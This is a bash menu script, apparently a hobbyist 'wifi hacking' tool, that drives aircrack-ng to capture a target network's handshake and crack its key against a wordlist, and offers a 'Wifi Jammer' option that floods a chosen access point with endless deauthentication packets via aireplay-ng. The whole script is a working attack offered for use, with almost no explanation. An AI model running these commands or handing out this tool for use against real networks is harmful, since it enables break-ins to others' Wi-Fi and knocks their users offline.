#!/bin/bash

logo () {
echo -e "$(tput setaf 1)
█    ██   ▄▄▄▄▄▄ ▀▄    ▄ ██   ▄█ █▄▄▄▄ ▄█▄    █▄▄▄▄ ██   ▄█▄    █  █▀ 
█    █ █ ▀   ▄▄▀   █  █  █ █  ██ █  ▄▀ █▀ ▀▄  █  ▄▀ █ █  █▀ ▀▄  █▄█   
█    █▄▄█ ▄▀▀   ▄▀  ▀█   █▄▄█ ██ █▀▀▌  █   ▀  █▀▀▌  █▄▄█ █   ▀  █▀▄   
███▄ █  █ ▀▀▀▀▀▀    █    █  █ ▐█ █  █  █▄  ▄▀ █  █  █  █ █▄  ▄▀ █  █  
    ▀   █         ▄▀        █  ▐   █   ▀███▀    █      █ ▀███▀    █   
       █                   █      ▀            ▀      █          ▀    
      ▀                   ▀                          ▀                "
}
start () {
echo -e "$(tput setaf 2)Starting script:"
sleep 0.4
echo "~"
sleep 0.4
echo "~"
sleep 0.4
echo ~$(tput setaf 7)
sleep 0.4 	
clear
}
option () {
echo -e "$(tput setaf 3) \n               A lazy script for aircrack-ng, wifi hacking.
        The script only Works if your wifi adapter has monitor mode."
echo -e "$(tput setaf 2)\n                       Developed by Sandesh (3xploitGuy)"
echo -e "\n$(tput setaf 3)                        [ Select Option To Continue ]\n\n"
echo "      $(tput setaf 1)[$(tput setaf 4)1$(tput setaf 1)] $(tput setaf 2)Wifi Hacking"
echo "      $(tput setaf 1)[$(tput setaf 4)2$(tput setaf 1)] $(tput setaf 2)Wifi Jammer"
echo -e "      $(tput setaf 1)[$(tput setaf 4)3$(tput setaf 1)] $(tput setaf 2)Exit\n\n$(tput setaf 7)"
}

logo
option
while true; do
echo -n "Select Option: "
read number
case $number in
  1) clear
logo
start
airmon-ng start wlan0
airodump-ng wlan0mon
read -p "Enter the target network BSSID > " bssid
read -p "Enter the target Channel > " ch
x-terminal-emulator -e ./airplay.sh $bssid
airodump-ng --bssid $bssid --channel $ch wlan0mon -w files 
aircrack-ng -w dictionary/dictionary.txt files-01.cap
set echo off
airmon-ng stop wlan0mon
rm files-01.cap files-01.csv files-01.kismet.csv files-01.kismet.netxml files-01.log.csv
logo
option
    ;;
  2) clear
logo
start
airmon-ng start wlan0
airodump-ng wlan0mon
read -p "Enter the network BSSID > " bssid
read -p "Enter the corresponding Channel > " ch
airodump-ng --bssid $bssid --channel $ch wlan0mon -w files
trap ctrl_c INT
function ctrl_c() {
airmon-ng stop wlan0mon
rm files-01.cap files-01.csv files-01.kismet.csv files-01.kismet.netxml files-01.log.csv
exit
}
aireplay-ng -0 0 -a $bssid wlan0mon 
    ;;
  3) echo -e "$(tput setaf 1)\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     break;
    ;;
  *) echo -e "$(tput setaf 1)Please select correct option.$(tput setaf 7)"
    ;;
esac
done
